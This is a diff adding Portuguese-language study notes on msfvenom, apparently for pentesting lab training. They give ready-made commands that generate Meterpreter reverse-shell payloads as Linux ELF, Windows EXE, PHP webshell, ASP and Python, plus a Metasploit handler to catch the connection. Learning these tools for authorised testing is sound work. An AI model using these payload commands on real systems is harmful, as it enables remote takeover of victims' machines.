@@ -186,10 +186,100 @@ Vulnerabilidades fáceis de identificar e explorar, que podem dar acesso inicial
 
 * Resultado: reporta logins válidos encontrados.
 
+# msfvenom
+O `msfvenom` substituiu o `msfpayload` e `msfencode`. Ele serve pra gerar payloads em vários formatos (exe, dll, php, elf, asp, etc.) para diferentes sistemas (Windows, Linux, Android, iOS, etc.).
 
+## Payloads:
 
+* Podem ser **stand-alone** (ex.: um `.exe` já pronto) ou **raw** (código puro, como Python ou PHP).
+* Exemplos de payloads comuns:
 
+* `windows/meterpreter/reverse_tcp`
+* `linux/x86/meterpreter/reverse_tcp`
+* `php/meterpreter/reverse_tcp`
+* `android/meterpreter/reverse_tcp`
 
+* **Listar payloads disponíveis**:
+
+  ```
+  msfvenom -l payloads
+  ```
+
+* **Formatos de saída**:
+  Ver os formatos suportados:
+
+  ```
+  msfvenom --list formats
+  ```
+
+* **Encoders**:
+
+  * Só fazem **codificação do payload** (ex.: base64).
+  * Não garantem bypass de antivírus.
+
+  Exemplo (PHP + Base64):
+
+  ```
+  msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 -f raw -e php/base64
+  ```
+
+## Handlers (Catching a Shell)
+
+* Depois de gerar o payload, você precisa de um **handler** pra receber a conexão (como um “ouvido” aberto).
+
+* Isso é feito no **Metasploit** com:
+
+  ```
+  use exploit/multi/handler
+  set payload php/reverse_php
+  set LHOST <seu_IP>
+  set LPORT <sua_porta>
+  run
+  ```
+
+* Quando a vítima executa o payload, a conexão chega e você ganha o **shell** ou **Meterpreter**.
+
+## Exemplos de Payloads
+
+* **Linux (.elf)**
+
+  ```
+  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+  chmod +x rev_shell.elf
+  ./rev_shell.elf
+  ```
+
+* **Windows (.exe)**
+
+  ```
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
+  ```
+
+* **PHP (webshell)**
+
+  ```
+  msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
+  ```
+
+* **ASP (IIS/Windows)**
+
+  ```
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
+  ```
+
+* **Python**
+
+  ```
+  msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+  ```
+
+## Pontos-Chave
+
+* `msfvenom` gera o payload.
+* O payload precisa de um **LHOST** (IP do atacante) e um **LPORT** (porta pra ouvir).
+* O **multi/handler** do Metasploit recebe a conexão.
+* Você pode criar payloads em praticamente qualquer linguagem/sistema.
+* Todos os exemplos dados são **reverse shells** (a vítima conecta de volta em você).
 
 
 
